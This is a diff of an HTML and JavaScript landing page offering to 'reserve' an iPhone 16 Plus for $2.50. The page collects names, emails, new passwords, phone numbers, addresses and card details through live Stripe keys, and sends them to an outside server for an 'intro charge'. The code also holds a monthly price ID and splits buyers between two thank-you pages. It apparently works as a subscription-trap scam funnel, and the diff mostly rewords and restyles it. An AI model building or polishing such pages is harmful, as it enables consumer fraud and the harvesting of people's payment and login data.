@@ -1,7 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-
   <!-- Google tag (gtag.js) -->
   <script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
   <script>
@@ -13,149 +12,167 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Claim Your iPhone 16 Plus Access</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <title>Reserve Your iPhone 16 Plus</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
 
   <style>
     :root{
-      --bg:#f3f5fb;
+      --bg:#f4f5f7;
       --card:#ffffff;
       --text:#111827;
       --muted:#6b7280;
       --line:#e5e7eb;
-      --cta1:#2563eb;
-      --cta2:#4f46e5;
+      --cta:#2563eb;
+      --cta-soft:#dbeafe;
       --radius:18px;
     }
-    *{box-sizing:border-box;}
+    *{box-sizing:border-box;margin:0;padding:0;}
     body{
-      margin:0;
       font-family:Inter,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
       background:var(--bg);
       color:var(--text);
+      min-height:100vh;
       display:flex;
-      flex-direction:column;
-      align-items:center;
-      padding:22px 14px 40px;
+      align-items:flex-start;
+      justify-content:center;
+      padding:26px 14px 40px;
     }
     .shell{
-      width:min(920px,100%);
+      width:min(860px,100%);
       display:flex;
       flex-direction:column;
       gap:18px;
     }
     .card{
       width:min(720px,100%);
+      margin:0 auto;
       background:var(--card);
       border:1px solid var(--line);
       border-radius:var(--radius);
-      padding:24px 22px 22px;
+      padding:22px 22px 20px;
       box-shadow:0 10px 26px rgba(15,23,42,.06);
-      margin-inline:auto;
+    }
+    .step{
+      display:none;
+    }
+    .step[aria-hidden="false"]{
+      display:block;
+    }
+
+    .top-label{
+      font-size:11px;
+      color:var(--muted);
+      text-align:center;
+      margin-bottom:4px;
     }
     .title{
-      font-size:26px;
-      font-weight:800;
+      font-size:24px;
+      font-weight:700;
       text-align:center;
-      margin:4px 0 8px;
+      margin-bottom:4px;
       letter-spacing:-0.01em;
     }
     .title span[data-price]{
-      color:var(--cta2);
-      font-weight:800;
+      color:var(--cta);
+      font-weight:700;
     }
     .sub{
-      text-align:center;
+      font-size:13px;
       color:var(--muted);
-      margin-top:0;
-      margin-bottom:16px;
-      font-size:14px;
+      text-align:center;
+      margin-bottom:14px;
     }
-    .badge{
-      display:inline-flex;
-      align-items:center;
-      gap:8px;
-      padding:4px 10px;
-      border-radius:999px;
-      background:#e0f2fe;
-      color:#0369a1;
-      font-size:10px;
-      margin:0 auto 6px;
-    }
-    .badge span.dot{
-      width:9px;
-      height:9px;
-      border-radius:999px;
-      background:#38bdf8;
-    }
+
     .img-wrap{
       display:flex;
       justify-content:center;
-      padding:8px 0 14px;
+      margin-bottom:16px;
     }
     .img-wrap img{
-      width:min(340px,78%);
+      width:min(360px,80%);
       height:auto;
       border-radius:16px;
       border:1px solid #e5e7eb;
-      box-shadow:0 10px 26px rgba(15,23,42,.10);
+      box-shadow:0 8px 22px rgba(15,23,42,.10);
+      object-fit:cover;
     }
+
     .grid{
       display:grid;
       grid-template-columns:1fr 1fr;
-      gap:12px;
+      gap:10px;
     }
     @media (max-width:560px){
       .grid{grid-template-columns:1fr;}
     }
-    .input{
+
+    .label{
+      font-size:12px;
+      font-weight:500;
+      color:#374151;
+      margin-bottom:4px;
+    }
+    .input,
+    select.input{
       width:100%;
-      padding:11px 10px;
+      padding:10px 10px;
+      border-radius:10px;
       border:1px solid #cbd5e1;
       background:#ffffff;
-      color:var(--text);
-      border-radius:10px;
       font-size:14px;
-      transition:border-color .16s ease, box-shadow .16s ease, background-color .16s ease;
+      color:var(--text);
+      transition:border-color .15s ease, box-shadow .15s ease, background-color .15s ease;
     }
     .input::placeholder{
       color:#9ca3af;
     }
     .input:focus{
       outline:none;
-      border-color:var(--cta1);
-      box-shadow:0 0 0 1px rgba(37,99,235,.06);
+      border-color:var(--cta);
+      box-shadow:0 0 0 1px var(--cta-soft);
       background:#f9fafb;
     }
+
+    .phone-wrap{
+      display:grid;
+      grid-template-columns:110px 1fr;
+      gap:8px;
+    }
+    @media (max-width:520px){
+      .phone-wrap{
+        grid-template-columns:1fr;
+      }
+    }
+
     .btn-row{
       display:flex;
       gap:10px;
       margin-top:14px;
     }
     .btn{
-      width:100%;
-      border:none;
-      border-radius:12px;
+      flex:1;
       padding:11px 16px;
-      font-weight:700;
+      border-radius:10px;
+      border:none;
       cursor:pointer;
-      font-size:15px;
-      background:linear-gradient(135deg,var(--cta1),var(--cta2));
-      color:#ffffff;
-      box-shadow:0 10px 24px rgba(37,99,235,.25);
+      font-size:14px;
+      font-weight:600;
       display:inline-flex;
       align-items:center;
       justify-content:center;
       gap:6px;
+      background:var(--cta);
+      color:#ffffff;
+      box-shadow:0 10px 22px rgba(37,99,235,.25);
       transition:all .16s ease;
     }
     .btn:hover{
       transform:translateY(-1px);
-      box-shadow:0 14px 32px rgba(37,99,235,.32);
+      box-shadow:0 14px 30px rgba(37,99,235,.30);
     }
     .btn:active{
       transform:translateY(1px);
-      box-shadow:0 6px 16px rgba(15,23,42,.22);
+      box-shadow:0 6px 14px rgba(15,23,42,.25);
     }
     .muted-btn{
       background:#e5e7eb;
@@ -164,33 +181,26 @@
     }
     .muted-btn:hover{
       background:#d4d4d8;
-      box-shadow:0 8px 18px rgba(15,23,42,.08);
+      box-shadow:0 6px 14px rgba(148,163,253,.25);
     }
-    .step{
-      display:none;
+
+    .hint{
+      font-size:11px;
+      color:var(--muted);
+      text-align:center;
+      margin-top:6px;
     }
-    .step[aria-hidden="false"]{
-      display:block;
+    .hint-left{
+      font-size:11px;
+      color:var(--muted);
+      text-align:left;
+      margin-top:6px;
     }
-    .label{
-      font-weight:600;
-      margin:4px 0 6px;
-      font-size:13px;
-      color:#111827;
-    }
-    .el{
-      width:100%;
-      background:#ffffff;
-      color:#111827;
-      border:1px solid #cbd5e1;
-      border-radius:10px;
-      padding:11px 10px;
-      font-size:14px;
-    }
+
     .brands{
       display:flex;
       justify-content:center;
-      gap:14px;
+      gap:12px;
       margin:14px 0 4px;
       opacity:.9;
     }
@@ -198,15 +208,16 @@
       height:20px;
     }
     .trust-text{
-      font-size:12px;
+      font-size:11px;
       color:var(--muted);
       text-align:center;
-      margin-top:10px;
+      margin-top:6px;
     }
+
     #err{
       width:100%;
       margin-top:10px;
-      font-size:13px;
+      font-size:12px;
       color:#b91c1c;
       background:#fef2f2;
       border:1px solid #fecaca;
@@ -217,35 +228,44 @@
     #err[aria-hidden="false"]{
       display:block;
     }
+
+    .el{
+      width:100%;
+      padding:10px 10px;
+      border-radius:10px;
+      border:1px solid #cbd5e1;
+      background:#ffffff;
+      font-size:14px;
+      color:var(--text);
+    }
+
     .loading-overlay{
       position:fixed;
       inset:0;
-      background:rgba(15,23,42,.08);
+      background:rgba(15,23,42,.12);
       display:none;
       align-items:center;
       justify-content:center;
-      flex-direction:column;
       z-index:9999;
-      text-align:center;
       backdrop-filter:blur(2px);
     }
     .loading-overlay[aria-hidden="false"]{
       display:flex;
     }
     .loading-box{
-      width:min(92vw,360px);
+      width:min(320px,90vw);
       background:#ffffff;
+      border-radius:14px;
       border:1px solid #e5e7eb;
-      border-radius:16px;
-      box-shadow:0 10px 30px rgba(15,23,42,.16);
-      padding:18px 16px 16px;
+      box-shadow:0 12px 30px rgba(15,23,42,.2);
+      padding:14px 14px 12px;
       text-align:center;
     }
     .loading-title{
-      font-weight:700;
-      margin:2px 0 10px;
+      font-size:14px;
+      font-weight:600;
+      margin-bottom:6px;
       color:#111827;
-      font-size:16px;
     }
     .progress-wrap{
       width:100%;
@@ -253,69 +273,54 @@
       background:#f3f4f6;
       border-radius:999px;
       overflow:hidden;
-      margin-bottom:6px;
+      margin-bottom:4px;
     }
     .progress-bar{
-      width:0%;
+      width:0;
       height:100%;
-      background:linear-gradient(90deg,var(--cta1),var(--cta2));
-      animation:loadingBar 2.2s ease-in-out infinite;
+      background:var(--cta);
+      animation:loadingBar 2.0s ease-in-out infinite;
     }
     @keyframes loadingBar{
       0%{width:0%}
-      60%{width:78%}
+      60%{width:80%}
       100%{width:100%}
-    }
-
-    /* Phone prefix + number layout */
-    .phone-wrap{
-      display:grid;
-      grid-template-columns:130px 1fr;
-      gap:8px;
-    }
-    @media (max-width:520px){
-      .phone-wrap{
-        grid-template-columns:1fr;
-      }
-    }
-
-    .mini-hint{
-      font-size:11px;
-      color:var(--muted);
-      text-align:center;
-      margin-top:4px;
     }
   </style>
 </head>
 <body>
 
-<!-- GoAffPro loader (keep this so the next page can track) -->
-<script type="text/javascript" src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
+<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde"></script>
 
 <div class="shell">
 
   <!-- STEP 1 -->
   <section id="step1" class="card step" aria-hidden="false">
-    <div class="badge">
-      <span class="dot"></span>
-      Partner Priority Allocation – Limited Regions
-    </div>
+    <div class="top-label">Step 1 of 2</div>
     <h1 class="title">
-      Claim your iPhone 16 Plus access for <span id="priceHero" data-price>$2.50</span>
+      Reserve your iPhone 16 Plus for <span id="priceHero" data-price>$2.50</span>
     </h1>
-    <p class="sub">Step 1 of 2 · Verify your contact details so we can confirm eligibility.</p>
+    <p class="sub">Enter your details to create your reservation profile.</p>
 
     <div class="img-wrap">
       <img src="Screenshot 2025-08-30 134339.png" alt="iPhone 16 Plus"/>
     </div>
 
     <div class="grid">
-      <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
-      <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
-      <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required />
-
       <div>
-        <div class="label">Mobile number (US / CA / AU / NZ)</div>
+        <div class="label">Full name</div>
+        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
+      </div>
+      <div>
+        <div class="label">Email</div>
+        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
+      </div>
+      <div>
+        <div class="label">Create password</div>
+        <input class="input" id="passwordInput" type="password" placeholder="Password" autocomplete="new-password" required />
+      </div>
+      <div>
+        <div class="label">Mobile (US / CA / AU / NZ)</div>
         <div class="phone-wrap">
           <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
           <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
@@ -324,40 +329,42 @@
     </div>
 
     <div class="btn-row">
-      <button id="nextBtn" class="btn">
-        Continue to secure payment →
-      </button>
+      <button id="nextBtn" class="btn">Next step →</button>
     </div>
-    <p class="mini-hint">We only use your details for verification and notifications. No spam, no resale.</p>
+    <div class="hint">
+      We only use your details to confirm your reservation and send updates.
+    </div>
   </section>
 
   <!-- STEP 2 -->
   <section id="step2" class="card step" aria-hidden="true">
-    <h2 class="title">Secure Payment</h2>
-    <p class="sub">Step 2 of 2 · Complete your introductory charge via our PCI-compliant processor.</p>
+    <div class="top-label">Step 2 of 2</div>
+    <h2 class="title">Secure payment details</h2>
+    <p class="sub">Add your address and card to complete the introductory charge.</p>
 
     <div class="label">Street address</div>
     <input id="billingStreet" class="input" autocomplete="address-line1" placeholder="Street address"/>
 
-    <div class="grid" style="margin-top:10px">
+    <div class="grid" style="margin-top:8px">
       <div>
         <div class="label">City</div>
         <input id="billingCity" class="input" autocomplete="address-level2" placeholder="City"/>
       </div>
       <div>
-        <div class="label">Post Code</div>
-        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post Code"/>
+        <div class="label">Post code</div>
+        <input id="billingPostcode" class="input" autocomplete="postal-code" placeholder="Post code"/>
       </div>
     </div>
 
-    <div class="label" style="margin-top:10px">Country (eligible regions)</div>
+    <div class="label" style="margin-top:8px">Country (eligible regions)</div>
     <select id="billingCountry" class="input" autocomplete="country"></select>
 
     <div id="gpay-button" style="margin-top:8px"></div>
 
-    <div class="label">Card number</div>
+    <div class="label" style="margin-top:8px">Card number</div>
     <div id="card-number" class="el"></div>
-    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px">
+
+    <div style="display:grid; grid-template-columns:1fr 1fr; gap:8px; margin-top:8px">
       <div>
         <div class="label">Expiration</div>
         <div id="card-expiry" class="el"></div>
@@ -382,7 +389,7 @@
       <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay">
     </div>
 
-    <p class="trust-text">🔒 256-bit SSL Secured · Processed by Stripe · 30-Day Money Back Guarantee</p>
+    <p class="trust-text">🔒 Processed by Stripe · 256-bit SSL · You can cancel within the trial period.</p>
   </section>
 </div>
 
@@ -391,7 +398,9 @@
   <div class="loading-box">
     <div class="loading-title">Processing your payment…</div>
     <div class="progress-wrap"><div class="progress-bar"></div></div>
-    <p class="sub" style="margin-top:4px;">Please keep this tab open while we confirm your bank.</p>
+    <p style="font-size:11px;color:#6b7280;margin-top:4px;">
+      Please keep this tab open while we confirm with your bank.
+    </p>
   </div>
 </div>
 
@@ -399,10 +408,9 @@
 <script src="https://js.stripe.com/v3"></script>
 <script>
   /* ---------- Step navigation & API base ---------- */
-
   const API_BASE = (() => {
     if (location.protocol.startsWith('http')) return location.origin;
-    return "http://localhost:10000"; // dev server
+    return "http://localhost:10000";
   })();
 
   const step1 = document.getElementById('step1');
@@ -419,7 +427,6 @@
   const billingPostcode = document.getElementById('billingPostcode');
   const billingCountry  = document.getElementById('billingCountry');
 
-  // Error + loading
   const $err    = document.getElementById("err");
   const overlay = document.getElementById("loading-overlay");
 
@@ -439,7 +446,6 @@
   }
 
   /* ---------- Allowed calling codes & countries (US/CA/AU/NZ only) ---------- */
-
   const CALLING_CODES = {
     US: { code: '+1',  name: 'United States' },
     CA: { code: '+1',  name: 'Canada' },
@@ -453,16 +459,15 @@
     selectEl.innerHTML = "";
     const order = ['US','CA','AU','NZ'];
 
-    // If IP-based country is eligible, put it first
     if (preferredCountry && ELIGIBLE_COUNTRIES.includes(preferredCountry)){
       const d = CALLING_CODES[preferredCountry];
       selectEl.append(new Option(`${d.code} — ${d.name}`, d.code, true, true));
     }
 
-    // Add remaining
     for (const cc of order){
       const d = CALLING_CODES[cc];
-      const exists = Array.from(selectEl.options).some(o => o.value === d.code && o.text.includes(d.name));
+      const exists = Array.from(selectEl.options)
+        .some(o => o.value === d.code && o.text.includes(d.name));
       if (!exists){
         selectEl.append(new Option(`${d.code} — ${d.name}`, d.code));
       }
@@ -503,7 +508,7 @@
   }
 
   function symbolFor(cc){
-    // You can differentiate later if needed; all show $2.50 for now
+    // All shown as $2.50 for simplicity
     return '$';
   }
 
@@ -511,13 +516,11 @@
     document.querySelectorAll('[data-price]').forEach(el => {
       el.textContent = symbol + '2.50';
     });
-    document.title = `Claim Your iPhone 16 Plus for ${symbol}2.50`;
+    document.title = `Reserve Your iPhone 16 Plus for ${symbol}2.50`;
   }
 
-  /* ---------- Geo by IP: set prefix + country from IP (clamped to US/CA/AU/NZ) ---------- */
-
+  /* ---------- Geo by IP: clamp to eligible + prefill ---------- */
   (function initGeo(){
-    // Initial safe defaults
     buildPrefixOptions(phonePrefix, 'US');
     buildCountryOptions(billingCountry, 'US');
     applyPriceSymbol('$');
@@ -545,14 +548,11 @@
           buildPrefixOptions(phonePrefix, chosen);
           buildCountryOptions(billingCountry, chosen);
           applyPriceSymbol(symbolFor(chosen));
-        }catch{
-          // already on defaults
-        }
+        }catch{/* keep defaults */}
       });
   })();
 
-  /* ---------- PREFILL from URL (email & phone) ---------- */
-
+  /* ---------- Prefill from URL (email & phone) ---------- */
   (function prefillFromQuery(){
     try{
       const qs = new URLSearchParams(location.search);
@@ -573,7 +573,7 @@
         let p = (phoneParam + '').replace(/[^\d+]/g,'');
         if (p.startsWith('+')){
           const codes = Array.from(new Set(Object.values(CALLING_CODES).map(x => x.code)))
-            .sort((a,b) => b.length - a.length);
+            .sort((a,b)=>b.length-a.length);
           const hit = codes.find(code => p.startsWith(code));
           if (hit){
             desiredPrefix = hit;
@@ -625,13 +625,10 @@
           if (applyPrefix() || tries > 15) clearInterval(t);
         }, 150);
       }
-    }catch{
-      // ignore
-    }
+    }catch{/* ignore */}
   })();
 
-  /* ---------- Account creation (unchanged logic, just wrapped) ---------- */
-
+  /* ---------- Account creation (same logic) ---------- */
   async function ensureAccount(){
     const email = (emailInput.value || '').trim();
     const password = passwordInput.value || '';
@@ -683,11 +680,10 @@
     step2.setAttribute("aria-hidden","true");
   };
 
-  /* ---------- Stripe logic (kept same as your server.js setup) ---------- */
-
+  /* ---------- Stripe logic (unchanged server-side flow) ---------- */
   const SUBSCRIBE_URL    = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-20";
   const PUBLISHABLE_KEY  = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
-  const FIXED_PRICE_ID   = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // unused but left intact
+  const FIXED_PRICE_ID   = "price_1Rzdp0EJXIhiKzYGlVxHGH7W"; // kept for compatibility
   const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
 
   const stripe   = Stripe(PUBLISHABLE_KEY);
@@ -785,7 +781,6 @@
         return;
       }
 
-      // Same 60/40 thank-you routing
       (function(){
         const A = 'thankyou-iphone.html';
         const B = 'thankyou-iphone-skip.html';
@@ -812,7 +807,6 @@
         const bucket = pid ? (fnv1a32(pid) % 100) : cryptoRandInt(100);
         const goSkip = bucket < 60;
         const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
-
         window.location.href = (goSkip ? B : A) + qb;
       })();
 
